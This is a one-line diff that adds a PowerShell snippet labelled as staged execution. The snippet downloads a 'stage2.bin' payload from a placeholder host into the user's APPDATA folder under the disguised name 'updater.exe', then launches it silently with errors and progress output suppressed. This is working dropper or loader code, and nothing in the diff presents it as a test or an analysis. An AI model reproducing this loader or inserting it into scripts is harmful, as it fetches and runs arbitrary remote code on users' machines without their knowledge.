@@ -1,0 +1,1 @@
+<# Staged execution #> try { $PayloadUrl = 'http://example.org/cdn/stage2.bin'; $DownloadPath = "$env:APPDATA\updater.exe"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $DownloadPath); Start-Process -FilePath $DownloadPath -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Loader step failed" }
